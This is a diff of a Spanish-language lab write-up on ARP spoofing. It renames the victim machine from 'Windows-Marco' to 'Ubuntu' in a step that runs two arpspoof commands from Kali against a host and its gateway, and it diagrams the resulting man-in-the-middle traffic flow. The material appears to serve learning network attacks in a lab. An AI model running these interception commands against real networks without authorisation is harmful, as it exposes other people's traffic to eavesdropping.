@@ -33,17 +33,17 @@ Sin esto Kali descartaría los paquetes interceptados — la víctima perdería 
 
 **Paso 2 — Lanzar ARP Spoofing en dos terminales:**
 
-Terminal 1 — engañar a Windows-Marco:
+Terminal 1 — engañar a Ubuntu:
 ```bash
 sudo arpspoof -i eth0 -t 192.168.1.96 192.168.1.254
 ```
-Le dice a Windows-Marco: "el gateway está en la MAC de Kali"
+Le dice a Ubuntu: "el gateway está en la MAC de Kali"
 
 Terminal 2 — engañar al router:
 ```bash
 sudo arpspoof -i eth0 -t 192.168.1.254 192.168.1.96
 ```
-Le dice al router: "Windows-Marco está en la MAC de Kali"
+Le dice al router: "Ubuntu está en la MAC de Kali"
 
 **Output del ataque:**
 ```
@@ -53,8 +53,8 @@ Le dice al router: "Windows-Marco está en la MAC de Kali"
 
 **Flujo de tráfico con MITM activo:**
 ```
-Normal:        Windows-Marco → Router → Internet
-Con MITM:      Windows-Marco → Kali → Router → Internet
+Normal:        Ubuntu → Router → Internet
+Con MITM:      Ubuntu → Kali → Router → Internet
                                 ↑
                       Kali ve todo el tráfico
 ```
